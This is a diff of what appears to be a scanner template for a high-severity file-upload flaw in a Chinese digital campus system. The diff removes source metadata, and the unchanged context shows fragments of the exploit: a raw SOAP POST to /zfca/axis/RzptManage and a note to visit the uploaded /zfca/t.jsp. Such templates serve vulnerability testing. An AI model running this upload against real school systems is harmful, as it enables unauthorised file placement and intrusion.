@@ -3,12 +3,8 @@ info:
   name: 数字化校园系统-RzptManage-文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qap5b03mcgcl5r91'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qap5b03mcgcl5r91
-    fofa: 暂无
 http:
 - raw:
   - 'POST /zfca/axis/RzptManage HTTP/1.1
@@ -62,7 +58,6 @@ http:
     </soapenv:Body>
 
     </soapenv:Envelope>
-
 
 
     访问/zfca/t.jsp'
